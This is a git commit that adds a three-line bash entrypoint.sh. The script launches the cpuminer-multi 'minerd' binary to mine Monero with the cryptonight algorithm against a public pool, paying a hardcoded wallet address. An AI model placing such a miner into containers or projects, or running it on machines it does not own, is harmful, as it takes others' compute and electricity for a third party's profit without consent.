e349beb01d7bd2261bc00ad01e6c938bf9e782b6
trompetto <phumakupoc@housat.com>
2017-02-13 20:05:14 +0200

    Create entrypoint.sh

---
+++ entrypoint.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+cd /cpuminer-multi
+./minerd -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
